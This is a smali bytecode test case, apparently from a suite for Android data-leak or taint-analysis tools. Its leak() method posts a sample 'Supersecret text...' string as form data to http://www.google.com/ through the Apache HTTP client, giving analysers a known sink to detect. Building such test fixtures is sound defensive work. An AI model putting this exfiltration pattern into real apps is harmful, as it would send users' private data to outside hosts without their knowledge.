.class public LTest_Sink_ApacheHTTP;
.super Ljava/lang/Object;

# interfaces
.implements LSinkTest;

# direct methods
.method public constructor <init>()V
    .registers 2

    invoke-direct {p0}, Ljava/lang/Object;-><init>()V
    return-void

.end method

# virtual methods
.method public getName()Ljava/lang/String;
    .registers 2
    
    const-string v0, "Sink: Apache HTTP Client"
    return-object v0
    
.end method

.method public getDescription()Ljava/lang/String;
    .registers 2

    const-string v0, "client.execute([+]);"
    return-object v0
    
.end method

.method public leak(Ljava/lang/Object;Landroid/content/Context;)V
	.registers 8

    # p1 = tainted string
    check-cast p1, Ljava/lang/StringBuilder;
    invoke-virtual {p1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;
    move-result-object p1

    # v0 = NameValuePair[]
    const/4 v0, 0x1
    new-array v0, v0, [Lorg/apache/http/NameValuePair;

    # v1 = new BasicNameValuePair("postedData", [+])
    new-instance v1, Lorg/apache/http/message/BasicNameValuePair;
    const-string v2, "postedData"
    invoke-direct {v1, v2, p1}, Lorg/apache/http/message/BasicNameValuePair;-><init>(Ljava/lang/String;Ljava/lang/String;)V

    # v0[0] = v1
    const/4 v2, 0x0
    aput-object v1, v0, v2

    # v0 = Arrays.asList(v0)
    invoke-static {v0}, Ljava/util/Arrays;->asList([Ljava/lang/Object;)Ljava/util/List;
    move-result-object v0

    # v1 = new UrlEncodedFormEntity(v0)
    new-instance v1, Lorg/apache/http/client/entity/UrlEncodedFormEntity;
    invoke-direct {v1, v0}, Lorg/apache/http/client/entity/UrlEncodedFormEntity;-><init>(Ljava/util/List;)V

    # v0 = new HttpPost("http://www.google.com/")
    const-string v2, "http://www.google.com/"
    new-instance v0, Lorg/apache/http/client/methods/HttpPost;
    invoke-direct {v0, v2}, Lorg/apache/http/client/methods/HttpPost;-><init>(Ljava/lang/String;)V

    # v0.setEntity(v1)
    invoke-virtual {v0, v1}, Lorg/apache/http/client/methods/HttpPost;->setEntity(Lorg/apache/http/HttpEntity;)V

    # v1 = new DefaultHttpClient()
    new-instance v1, Lorg/apache/http/impl/client/DefaultHttpClient;
    invoke-direct {v1}, Lorg/apache/http/impl/client/DefaultHttpClient;-><init>()V

    :try_start_26
    invoke-virtual {v1, v0}, Lorg/apache/http/impl/client/DefaultHttpClient;->execute(Lorg/apache/http/client/methods/HttpUriRequest;)Lorg/apache/http/HttpResponse;
    :try_end_29
    .catch Ljava/io/IOException; {:try_start_26 .. :try_end_29} :catch_34
    .catch Lorg/apache/http/client/ClientProtocolException; {:try_start_26 .. :try_end_29} :catch_34

    return-void

    :catch_34
    move-exception v0
    invoke-virtual {v0}, Ljava/lang/Throwable;->printStackTrace()V
    return-void

.end method

.method public arg()Ljava/lang/Object;
    .registers 2

    const-string v0, "Supersecret text..."
    new-instance v1, Ljava/lang/StringBuilder;
    invoke-direct {v1, v0}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    return-object v1

.end method